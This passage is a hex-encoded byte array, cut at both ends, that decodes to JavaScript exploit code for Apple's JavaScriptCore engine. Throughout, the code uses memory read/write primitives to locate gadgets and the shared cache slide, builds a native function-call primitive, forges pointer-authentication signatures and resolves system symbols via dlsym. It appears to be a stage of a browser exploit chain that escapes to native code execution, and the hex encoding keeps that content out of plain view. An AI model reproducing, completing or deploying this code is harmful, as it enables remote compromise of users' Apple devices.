0x20, 0x78, 0x70, 0x61, 0x63, 0x5f, 0x67, 0x61, 0x64, 0x67, 0x65, 0x74, 0x20, 0x3d, 0x20, 0x30, 0x6e, 0x3b, 0xa, 0x20, 0x20, 0x73, 0x74, 0x61, 0x67, 0x65, 0x31, 0x5f, 0x6a, 0x73, 0x20, 0x3d, 0x20, 0x30, 0x6e, 0x3b, 0xa, 0x20, 0x20, 0x73, 0x74, 0x61, 0x67, 0x65, 0x32, 0x5f, 0x6a, 0x73, 0x20, 0x3d, 0x20, 0x30, 0x6e, 0x3b, 0xa, 0x20, 0x20, 0x74, 0x68, 0x72, 0x65, 0x61, 0x64, 0x5f, 0x61, 0x72, 0x67, 0x20, 0x3d, 0x20, 0x30, 0x6e, 0x3b, 0xa, 0x20, 0x20, 0x67, 0x65, 0x74, 0x5f, 0x74, 0x68, 0x72, 0x65, 0x61, 0x64, 0x5f, 0x61, 0x72, 0x67, 0x73, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x29, 0x20, 0x7b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x72, 0x65, 0x74, 0x75, 0x72, 0x6e, 0x20, 0x74, 0x68, 0x72, 0x65, 0x61, 0x64, 0x5f, 0x61, 0x72, 0x67, 0x3b, 0xa, 0x20, 0x20, 0x7d, 0x3b, 0xa, 0x20, 0x20, 0x6c, 0x65, 0x74, 0x20, 0x53, 0x59, 0x53, 0x4c, 0x4f, 0x47, 0x20, 0x3d, 0x20, 0x30, 0x6e, 0x3b, 0xa, 0x20, 0x20, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x69, 0x6e, 0x69, 0x74, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x29, 0x20, 0x7b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x5f, 0x6f, 0x66, 0x66, 0x73, 0x65, 0x74, 0x73, 0x5f, 0x62, 0x75, 0x66, 0x66, 0x65, 0x72, 0x20, 0x3d, 0x20, 0x75, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x28, 0x61, 0x64, 0x64, 0x72, 0x6f, 0x66, 0x28, 0x66, 0x75, 0x6e, 0x63, 0x5f, 0x6f, 0x66, 0x66, 0x73, 0x65, 0x74, 0x73, 0x5f, 0x61, 0x72, 0x72, 0x61, 0x79, 0x29, 0x20, 0x2b, 0x20, 0x30, 0x78, 0x31, 0x30, 0x6e, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x6c, 0x65, 0x74, 0x20, 0x69, 0x64, 0x78, 0x20, 0x3d, 0x20, 0x30, 0x6e, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x44, 0x4c, 0x53, 0x59, 0x4d, 0x20, 0x3d, 0x20, 0x75, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x28, 0x66, 0x75, 0x6e, 0x63, 0x5f, 0x6f, 0x66, 0x66, 0x73, 0x65, 0x74, 0x73, 0x5f, 0x62, 0x75, 0x66, 0x66, 0x65, 0x72, 0x20, 0x2b, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2a, 0x20, 0x30, 0x78, 0x38, 0x6e, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2b, 0x3d, 0x20, 0x31, 0x6e, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x64, 0x79, 0x6c, 0x64, 0x5f, 0x73, 0x69, 0x67, 0x6e, 0x50, 0x6f, 0x69, 0x6e, 0x74, 0x65, 0x72, 0x5f, 0x67, 0x61, 0x64, 0x67, 0x65, 0x74, 0x20, 0x3d, 0x20, 0x75, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x28, 0x66, 0x75, 0x6e, 0x63, 0x5f, 0x6f, 0x66, 0x66, 0x73, 0x65, 0x74, 0x73, 0x5f, 0x62, 0x75, 0x66, 0x66, 0x65, 0x72, 0x20, 0x2b, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2a, 0x20, 0x30, 0x78, 0x38, 0x6e, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2b, 0x3d, 0x20, 0x31, 0x6e, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x6a, 0x73, 0x5f, 0x69, 0x6e, 0x70, 0x75, 0x74, 0x73, 0x20, 0x3d, 0x20, 0x75, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x28, 0x66, 0x75, 0x6e, 0x63, 0x5f, 0x6f, 0x66, 0x66, 0x73, 0x65, 0x74, 0x73, 0x5f, 0x62, 0x75, 0x66, 0x66, 0x65, 0x72, 0x20, 0x2b, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2a, 0x20, 0x30, 0x78, 0x38, 0x6e, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2b, 0x3d, 0x20, 0x31, 0x6e, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x74, 0x68, 0x72, 0x65, 0x61, 0x64, 0x5f, 0x61, 0x72, 0x67, 0x20, 0x3d, 0x20, 0x75, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x28, 0x66, 0x75, 0x6e, 0x63, 0x5f, 0x6f, 0x66, 0x66, 0x73, 0x65, 0x74, 0x73, 0x5f, 0x62, 0x75, 0x66, 0x66, 0x65, 0x72, 0x20, 0x2b, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2a, 0x20, 0x30, 0x78, 0x38, 0x6e, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2b, 0x3d, 0x20, 0x31, 0x6e, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x73, 0x68, 0x61, 0x72, 0x65, 0x64, 0x5f, 0x63, 0x61, 0x63, 0x68, 0x65, 0x5f, 0x73, 0x6c, 0x69, 0x64, 0x65, 0x20, 0x3d, 0x20, 0x75, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x28, 0x66, 0x75, 0x6e, 0x63, 0x5f, 0x6f, 0x66, 0x66, 0x73, 0x65, 0x74, 0x73, 0x5f, 0x62, 0x75, 0x66, 0x66, 0x65, 0x72, 0x20, 0x2b, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2a, 0x20, 0x30, 0x78, 0x38, 0x6e, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2b, 0x3d, 0x20, 0x31, 0x6e, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x6a, 0x73, 0x76, 0x6d, 0x5f, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x62, 0x75, 0x66, 0x66, 0x20, 0x3d, 0x20, 0x75, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x28, 0x66, 0x75, 0x6e, 0x63, 0x5f, 0x6f, 0x66, 0x66, 0x73, 0x65, 0x74, 0x73, 0x5f, 0x62, 0x75, 0x66, 0x66, 0x65, 0x72, 0x20, 0x2b, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2a, 0x20, 0x30, 0x78, 0x38, 0x6e, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2b, 0x3d, 0x20, 0x31, 0x6e, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x6a, 0x73, 0x76, 0x6d, 0x5f, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x70, 0x63, 0x20, 0x3d, 0x20, 0x75, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x28, 0x66, 0x75, 0x6e, 0x63, 0x5f, 0x6f, 0x66, 0x66, 0x73, 0x65, 0x74, 0x73, 0x5f, 0x62, 0x75, 0x66, 0x66, 0x65, 0x72, 0x20, 0x2b, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2a, 0x20, 0x30, 0x78, 0x38, 0x6e, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2b, 0x3d, 0x20, 0x31, 0x6e, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x6a, 0x73, 0x76, 0x6d, 0x5f, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x61, 0x72, 0x67, 0x73, 0x20, 0x3d, 0x20, 0x75, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x28, 0x66, 0x75, 0x6e, 0x63, 0x5f, 0x6f, 0x66, 0x66, 0x73, 0x65, 0x74, 0x73, 0x5f, 0x62, 0x75, 0x66, 0x66, 0x65, 0x72, 0x20, 0x2b, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2a, 0x20, 0x30, 0x78, 0x38, 0x6e, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2b, 0x3d, 0x20, 0x31, 0x6e, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x5f, 0x43, 0x46, 0x4f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x43, 0x6f, 0x70, 0x79, 0x50, 0x72, 0x6f, 0x70, 0x65, 0x72, 0x74, 0x79, 0x20, 0x3d, 0x20, 0x75, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x28, 0x66, 0x75, 0x6e, 0x63, 0x5f, 0x6f, 0x66, 0x66, 0x73, 0x65, 0x74, 0x73, 0x5f, 0x62, 0x75, 0x66, 0x66, 0x65, 0x72, 0x20, 0x2b, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2a, 0x20, 0x30, 0x78, 0x38, 0x6e, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2b, 0x3d, 0x20, 0x31, 0x6e, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x6c, 0x6f, 0x61, 0x64, 0x5f, 0x78, 0x31, 0x78, 0x33, 0x78, 0x38, 0x20, 0x3d, 0x20, 0x75, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x28, 0x66, 0x75, 0x6e, 0x63, 0x5f, 0x6f, 0x66, 0x66, 0x73, 0x65, 0x74, 0x73, 0x5f, 0x62, 0x75, 0x66, 0x66, 0x65, 0x72, 0x20, 0x2b, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2a, 0x20, 0x30, 0x78, 0x38, 0x6e, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2b, 0x3d, 0x20, 0x31, 0x6e, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x31, 0x34, 0x5f, 0x61, 0x72, 0x67, 0x73, 0x5f, 0x77, 0x72, 0x69, 0x74, 0x65, 0x5f, 0x78, 0x38, 0x20, 0x3d, 0x20, 0x75, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x28, 0x66, 0x75, 0x6e, 0x63, 0x5f, 0x6f, 0x66, 0x66, 0x73, 0x65, 0x74, 0x73, 0x5f, 0x62, 0x75, 0x66, 0x66, 0x65, 0x72, 0x20, 0x2b, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2a, 0x20, 0x30, 0x78, 0x38, 0x6e, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2b, 0x3d, 0x20, 0x31, 0x6e, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x6a, 0x73, 0x76, 0x6d, 0x5f, 0x69, 0x73, 0x4e, 0x41, 0x4e, 0x5f, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x67, 0x61, 0x64, 0x67, 0x65, 0x74, 0x20, 0x3d, 0x20, 0x75, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x28, 0x66, 0x75, 0x6e, 0x63, 0x5f, 0x6f, 0x66, 0x66, 0x73, 0x65, 0x74, 0x73, 0x5f, 0x62, 0x75, 0x66, 0x66, 0x65, 0x72, 0x20, 0x2b, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2a, 0x20, 0x30, 0x78, 0x38, 0x6e, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2b, 0x3d, 0x20, 0x31, 0x6e, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x6a, 0x73, 0x76, 0x6d, 0x5f, 0x69, 0x73, 0x4e, 0x41, 0x4e, 0x5f, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x67, 0x61, 0x64, 0x67, 0x65, 0x74, 0x32, 0x20, 0x3d, 0x20, 0x75, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x28, 0x66, 0x75, 0x6e, 0x63, 0x5f, 0x6f, 0x66, 0x66, 0x73, 0x65, 0x74, 0x73, 0x5f, 0x62, 0x75, 0x66, 0x66, 0x65, 0x72, 0x20, 0x2b, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2a, 0x20, 0x30, 0x78, 0x38, 0x6e, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2b, 0x3d, 0x20, 0x31, 0x6e, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x78, 0x70, 0x61, 0x63, 0x5f, 0x67, 0x61, 0x64, 0x67, 0x65, 0x74, 0x20, 0x3d, 0x20, 0x75, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x28, 0x66, 0x75, 0x6e, 0x63, 0x5f, 0x6f, 0x66, 0x66, 0x73, 0x65, 0x74, 0x73, 0x5f, 0x62, 0x75, 0x66, 0x66, 0x65, 0x72, 0x20, 0x2b, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2a, 0x20, 0x30, 0x78, 0x38, 0x6e, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2b, 0x3d, 0x20, 0x31, 0x6e, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x73, 0x74, 0x61, 0x67, 0x65, 0x31, 0x5f, 0x6a, 0x73, 0x20, 0x3d, 0x20, 0x75, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x28, 0x6a, 0x73, 0x5f, 0x69, 0x6e, 0x70, 0x75, 0x74, 0x73, 0x20, 0x2b, 0x20, 0x30, 0x78, 0x30, 0x30, 0x6e, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x6c, 0x65, 0x74, 0x20, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x77, 0x72, 0x61, 0x70, 0x70, 0x65, 0x72, 0x20, 0x3d, 0x20, 0x22, 0x22, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x66, 0x6f, 0x72, 0x20, 0x28, 0x6c, 0x65, 0x74, 0x20, 0x69, 0x20, 0x3d, 0x20, 0x30, 0x6e, 0x3b, 0x20, 0x69, 0x20, 0x3c, 0x20, 0x30, 0x78, 0x35, 0x30, 0x6e, 0x3b, 0x20, 0x69, 0x20, 0x2b, 0x3d, 0x20, 0x30, 0x78, 0x38, 0x6e, 0x29, 0x20, 0x7b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x77, 0x72, 0x61, 0x70, 0x70, 0x65, 0x72, 0x20, 0x3d, 0x20, 0x75, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x28, 0x6a, 0x73, 0x76, 0x6d, 0x5f, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x62, 0x75, 0x66, 0x66, 0x20, 0x2b, 0x20, 0x69, 0x29, 0x2e, 0x68, 0x65, 0x78, 0x50, 0x6c, 0x61, 0x69, 0x6e, 0x28, 0x29, 0x20, 0x2b, 0x20, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x77, 0x72, 0x61, 0x70, 0x70, 0x65, 0x72, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x7d, 0xa, 0x20, 0x20, 0x20, 0x20, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x61, 0x72, 0x67, 0x73, 0x5f, 0x77, 0x72, 0x61, 0x70, 0x70, 0x65, 0x72, 0x20, 0x3d, 0x20, 0x42, 0x69, 0x67, 0x49, 0x6e, 0x74, 0x28, 0x22, 0x30, 0x78, 0x22, 0x20, 0x2b, 0x20, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x77, 0x72, 0x61, 0x70, 0x70, 0x65, 0x72, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x61, 0x64, 0x64, 0x72, 0x6f, 0x66, 0x5f, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x61, 0x72, 0x67, 0x73, 0x5f, 0x77, 0x72, 0x61, 0x70, 0x70, 0x65, 0x72, 0x20, 0x3d, 0x20, 0x67, 0x65, 0x74, 0x5f, 0x62, 0x69, 0x67, 0x69, 0x6e, 0x74, 0x5f, 0x61, 0x64, 0x64, 0x72, 0x28, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x61, 0x72, 0x67, 0x73, 0x5f, 0x77, 0x72, 0x61, 0x70, 0x70, 0x65, 0x72, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x53, 0x59, 0x53, 0x4c, 0x4f, 0x47, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x5f, 0x72, 0x65, 0x73, 0x6f, 0x6c, 0x76, 0x65, 0x28, 0x22, 0x73, 0x79, 0x73, 0x6c, 0x6f, 0x67, 0x22, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x7d, 0x3b, 0xa, 0x20, 0x20, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x70, 0x63, 0x2c, 0x20, 0x2e, 0x2e, 0x2e, 0x61, 0x72, 0x67, 0x73, 0x29, 0x20, 0x7b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x75, 0x77, 0x72, 0x69, 0x74, 0x65, 0x36, 0x34, 0x28, 0x6a, 0x73, 0x76, 0x6d, 0x5f, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x70, 0x63, 0x2c, 0x20, 0x70, 0x63, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x66, 0x6f, 0x72, 0x20, 0x28, 0x6c, 0x65, 0x74, 0x20, 0x69, 0x64, 0x78, 0x20, 0x3d, 0x20, 0x30, 0x6e, 0x3b, 0x20, 0x69, 0x64, 0x78, 0x20, 0x3c, 0x20, 0x42, 0x69, 0x67, 0x49, 0x6e, 0x74, 0x28, 0x61, 0x72, 0x67, 0x75, 0x6d, 0x65, 0x6e, 0x74, 0x73, 0x2e, 0x6c, 0x65, 0x6e, 0x67, 0x74, 0x68, 0x20, 0x2d, 0x20, 0x31, 0x29, 0x3b, 0x20, 0x69, 0x64, 0x78, 0x2b, 0x2b, 0x29, 0x20, 0x7b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x75, 0x77, 0x72, 0x69, 0x74, 0x65, 0x36, 0x34, 0x28, 0x6a, 0x73, 0x76, 0x6d, 0x5f, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x61, 0x72, 0x67, 0x73, 0x20, 0x2b, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2a, 0x20, 0x38, 0x6e, 0x2c, 0x20, 0x61, 0x72, 0x67, 0x75, 0x6d, 0x65, 0x6e, 0x74, 0x73, 0x5b, 0x69, 0x64, 0x78, 0x20, 0x2b, 0x20, 0x31, 0x6e, 0x5d, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x7d, 0xa, 0x20, 0x20, 0x20, 0x20, 0x69, 0x73, 0x4e, 0x61, 0x4e, 0x28, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x61, 0x72, 0x67, 0x73, 0x5f, 0x77, 0x72, 0x61, 0x70, 0x70, 0x65, 0x72, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x72, 0x65, 0x74, 0x75, 0x72, 0x6e, 0x20, 0x75, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x28, 0x61, 0x64, 0x64, 0x72, 0x6f, 0x66, 0x5f, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x61, 0x72, 0x67, 0x73, 0x5f, 0x77, 0x72, 0x61, 0x70, 0x70, 0x65, 0x72, 0x20, 0x2b, 0x20, 0x30, 0x78, 0x32, 0x38, 0x6e, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x7d, 0x3b, 0xa, 0x20, 0x20, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x77, 0x69, 0x74, 0x68, 0x5f, 0x70, 0x61, 0x63, 0x69, 0x61, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x70, 0x63, 0x2c, 0x20, 0x2e, 0x2e, 0x2e, 0x61, 0x72, 0x67, 0x73, 0x29, 0x20, 0x7b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x70, 0x63, 0x20, 0x3d, 0x20, 0x70, 0x61, 0x63, 0x69, 0x61, 0x28, 0x70, 0x63, 0x2e, 0x6e, 0x6f, 0x50, 0x41, 0x43, 0x28, 0x29, 0x2c, 0x20, 0x30, 0x78, 0x63, 0x32, 0x64, 0x30, 0x6e, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x75, 0x77, 0x72, 0x69, 0x74, 0x65, 0x36, 0x34, 0x28, 0x6a, 0x73, 0x76, 0x6d, 0x5f, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x70, 0x63, 0x2c, 0x20, 0x70, 0x63, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x66, 0x6f, 0x72, 0x20, 0x28, 0x6c, 0x65, 0x74, 0x20, 0x69, 0x64, 0x78, 0x20, 0x3d, 0x20, 0x30, 0x6e, 0x3b, 0x20, 0x69, 0x64, 0x78, 0x20, 0x3c, 0x20, 0x42, 0x69, 0x67, 0x49, 0x6e, 0x74, 0x28, 0x61, 0x72, 0x67, 0x75, 0x6d, 0x65, 0x6e, 0x74, 0x73, 0x2e, 0x6c, 0x65, 0x6e, 0x67, 0x74, 0x68, 0x20, 0x2d, 0x20, 0x31, 0x29, 0x3b, 0x20, 0x69, 0x64, 0x78, 0x2b, 0x2b, 0x29, 0x20, 0x7b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x75, 0x77, 0x72, 0x69, 0x74, 0x65, 0x36, 0x34, 0x28, 0x6a, 0x73, 0x76, 0x6d, 0x5f, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x61, 0x72, 0x67, 0x73, 0x20, 0x2b, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2a, 0x20, 0x38, 0x6e, 0x2c, 0x20, 0x61, 0x72, 0x67, 0x75, 0x6d, 0x65, 0x6e, 0x74, 0x73, 0x5b, 0x69, 0x64, 0x78, 0x20, 0x2b, 0x20, 0x31, 0x6e, 0x5d, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x7d, 0xa, 0x20, 0x20, 0x20, 0x20, 0x69, 0x73, 0x4e, 0x61, 0x4e, 0x28, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x61, 0x72, 0x67, 0x73, 0x5f, 0x77, 0x72, 0x61, 0x70, 0x70, 0x65, 0x72, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x72, 0x65, 0x74, 0x75, 0x72, 0x6e, 0x20, 0x75, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x28, 0x61, 0x64, 0x64, 0x72, 0x6f, 0x66, 0x5f, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x61, 0x72, 0x67, 0x73, 0x5f, 0x77, 0x72, 0x61, 0x70, 0x70, 0x65, 0x72, 0x20, 0x2b, 0x20, 0x30, 0x78, 0x32, 0x38, 0x6e, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x7d, 0x3b, 0xa, 0x20, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x5f, 0x72, 0x65, 0x73, 0x6f, 0x6c, 0x76, 0x65, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x73, 0x79, 0x6d, 0x62, 0x6f, 0x6c, 0x29, 0x20, 0x7b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x6c, 0x65, 0x74, 0x20, 0x66, 0x70, 0x74, 0x72, 0x20, 0x3d, 0x20, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x28, 0x44, 0x4c, 0x53, 0x59, 0x4d, 0x2c, 0x20, 0x30, 0x78, 0x46, 0x46, 0x46, 0x46, 0x46, 0x46, 0x46, 0x46, 0x46, 0x46, 0x46, 0x46, 0x46, 0x46, 0x46, 0x45, 0x6e, 0x2c, 0x20, 0x67, 0x65, 0x74, 0x5f, 0x63, 0x73, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x28, 0x73, 0x79, 0x6d, 0x62, 0x6f, 0x6c, 0x29, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x72, 0x65, 0x74, 0x75, 0x72, 0x6e, 0x20, 0x70, 0x61, 0x63, 0x69, 0x61, 0x28, 0x66, 0x70, 0x74, 0x72, 0x2e, 0x6e, 0x6f, 0x50, 0x41, 0x43, 0x28, 0x29, 0x2c, 0x20, 0x30, 0x78, 0x63, 0x32, 0x64, 0x30, 0x6e, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x7d, 0x3b, 0xa, 0x20, 0x20, 0x70, 0x61, 0x63, 0x69, 0x61, 0x5f, 0x62, 0x5f, 0x69, 0x6e, 0x74, 0x65, 0x72, 0x6e, 0x61, 0x6c, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x70, 0x74, 0x72, 0x2c, 0x20, 0x63, 0x74, 0x78, 0x2c, 0x20, 0x6b, 0x65, 0x79, 0x5f, 0x74, 0x79, 0x70, 0x65, 0x29, 0x20, 0x7b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x6c, 0x65, 0x74, 0x20, 0x75, 0x73, 0x65, 0x5f, 0x61, 0x64, 0x64, 0x72, 0x5f, 0x64, 0x69, 0x76, 0x65, 0x72, 0x73, 0x69, 0x74, 0x79, 0x20, 0x3d, 0x20, 0x30, 0x6e, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x6c, 0x65, 0x74, 0x20, 0x61, 0x64, 0x64, 0x72, 0x20, 0x3d, 0x20, 0x30, 0x6e, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x69, 0x66, 0x20, 0x28, 0x63, 0x74, 0x78, 0x20, 0x3e, 0x3e, 0x20, 0x31, 0x36, 0x6e, 0x20, 0x21, 0x3d, 0x20, 0x30, 0x6e, 0x29, 0x20, 0x7b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x75, 0x73, 0x65, 0x5f, 0x61, 0x64, 0x64, 0x72, 0x5f, 0x64, 0x69, 0x76, 0x65, 0x72, 0x73, 0x69, 0x74, 0x79, 0x20, 0x3d, 0x20, 0x31, 0x6e, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x61, 0x64, 0x64, 0x72, 0x20, 0x3d, 0x20, 0x63, 0x74, 0x78, 0x20, 0x26, 0x20, 0x30, 0x78, 0x46, 0x46, 0x46, 0x46, 0x46, 0x46, 0x46, 0x46, 0x46, 0x46, 0x46, 0x46, 0x6e, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x63, 0x74, 0x78, 0x20, 0x3d, 0x20, 0x63, 0x74, 0x78, 0x20, 0x3e, 0x3e, 0x20, 0x34, 0x38, 0x6e, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x7d, 0xa, 0x20, 0x20, 0x20, 0x20, 0x72, 0x65, 0x74, 0x75, 0x72, 0x6e, 0x20, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x28, 0x64, 0x79, 0x6c, 0x64, 0x5f, 0x73, 0x69, 0x67, 0x6e, 0x50, 0x6f, 0x69, 0x6e, 0x74, 0x65, 0x72, 0x5f, 0x67, 0x61, 0x64, 0x67, 0x65, 0x74, 0x2c, 0x20, 0x70, 0x74, 0x72, 0x2c, 0x20, 0x61, 0x64, 0x64, 0x72, 0x2c, 0x20, 0x75, 0x73, 0x65, 0x5f, 0x61, 0x64, 0x64, 0x72, 0x5f, 0x64, 0x69, 0x76, 0x65, 0x72, 0x73, 0x69, 0x74, 0x79, 0x2c, 